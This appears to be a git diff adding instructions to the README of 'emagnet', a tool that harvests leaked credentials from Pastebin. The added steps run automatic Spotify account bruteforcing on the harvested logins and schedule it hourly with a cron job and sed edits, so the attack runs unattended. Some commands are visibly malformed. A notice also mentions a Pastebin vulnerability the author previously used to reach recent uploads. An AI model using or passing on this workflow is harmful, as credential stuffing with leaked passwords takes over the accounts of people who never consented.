@@ -27,6 +27,40 @@
 
 Visit [releases](https://github.com/wuseman/EMAGNET/releases) for more info about the beta script.
 
+Simple example how things can be done, no support will be given for this - Wait for a future release please.
+
+Step By Step! Dirty Version! Until I get everything together into one script. 
+
+----- Tab 1
+    
+    git clone git@github.com:/wuseman/emagnet
+    cd emagnet
+    # Set time to 1 hour + 10 seconds (add more seconds if your bw is very slow)
+    bash emagnet.sh -t 3610
+    # Run emagnet in screen with auto spotify bruteforce enable.. 
+    bash emagnet.sh -q -b spotify 
+    # Or without screen if you wanna see in realtime wich account is valid and available to use
+    bash emagnet.sh -b spotify 
+  
+----- Tab 2 - Keep above running in one tab and run below commands in another tab: 
+
+    # Source emagnet.conf, place the line under the vERSION="v4.0.0" in emagnet-v4.0.0.-beta.sh
+    BLINE=$(awk '/vERSION="4.0.0"/ {print NR+1}' emagnet_v4..0.0.sh)
+    sed "${BLINE}i . ~/.emagnet/emagnet.conf" ./emagnet_v4.0.0-beta   
+    
+    # Change folders in beta script so emagnet.sh can grab accounts to bruteforce:
+    sed 's/nPATH="$HOME\/emagnet-temp//$EMAGNETHOME/.temp/g' emagnet_v4.0.0-beta.sh
+      
+    # Add a cronie line for emagnet beta to be executed every hour (36010ecs) after before autobruter will be executed from tab1
+    (crontab -l 2>/dev/null; echo "*/60 * * * * /path/to/emagnet_v4.0.0-beta.sh -with args") | crontab -
+
+    ----- Result
+
+    Every hour emagnet_v4.0.0-beta.sh is executed in background, and
+    ...10 seconds later....emagnet.sh will bruteforcing the accounts
+    
+Sorry for the mess, if you do not understand at all how this works, please find another tool for this purpose ;) 
+
 ### Notice: 
 
 Pastebin patched the vulnerability I previously used in order to get recent uploads from https://pastebin.com/archive, so at the moment it is not possible to get recently uploaded files, you are now limited to all syntaxes exempt the default one (95% get's uploaded as 'text' and this is removed from all recent upload lists). 
